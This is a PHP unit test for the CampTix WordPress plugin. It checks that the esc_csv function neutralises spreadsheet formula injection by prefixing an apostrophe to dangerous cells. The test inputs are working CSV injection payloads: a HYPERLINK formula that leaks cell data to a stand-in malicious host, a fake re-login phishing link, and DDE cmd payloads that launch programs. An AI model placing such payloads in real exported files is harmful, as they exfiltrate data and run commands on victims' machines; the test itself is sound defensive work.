<?php

defined( 'WPINC' ) or die();

/**
 * @covers CampTix_Plugin
 */
class Test_CampTix_Plugin extends \WP_UnitTestCase {
	/**
	 * @covers CampTix_Plugin::esc_csv
	 */
	public function test_esc_csv() {
		$test_input = array(
			'CampTix',
			'=HYPERLINK("http://malicious.example.org/?leak="&A1,"Error: Click here to fix.")',
			'@HYPERLINK("http://malicious.example.org/wp-login.php","Please log back in to your account for more.")',
			"-2+3+cmd|' /C mstsc'!A0",
			"+2+3+cmd|' /C mspaint'!A0",
		);

		$expected_output = array(
			'CampTix',
			'\'=HYPERLINK("http://malicious.example.org/?leak="&A1,"Error: Click here to fix.")',
			'\'@HYPERLINK("http://malicious.example.org/wp-login.php","Please log back in to your account for more.")',
			"'-2+3+cmd|' /C mstsc'!A0",
			"'+2+3+cmd|' /C mspaint'!A0",
		);

		$this->assertEquals( $expected_output, CampTix_Plugin::esc_csv( $test_input ) );
	}
}
